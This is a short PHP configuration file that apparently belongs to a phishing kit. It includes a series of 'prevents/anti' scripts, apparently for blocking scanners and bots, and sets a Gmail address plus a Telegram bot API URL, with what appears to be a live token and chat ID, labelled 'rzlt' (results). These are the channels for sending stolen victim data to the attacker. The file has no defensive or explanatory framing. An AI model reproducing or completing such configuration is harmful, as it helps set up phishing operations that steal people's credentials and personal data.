<?php
/*

 
                                                                                                
                                                                                                
                                                                                                

*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';

$email ="dzsube@gmail.com"; 

//telgram rzlt
$api = "https://api.telegram.org/bot5509320178:AAGOE2iKGlYvvdKaabELXrDjKPdzJ0x9i1M/sendMessage?";
$chatid = "5412557482";


?>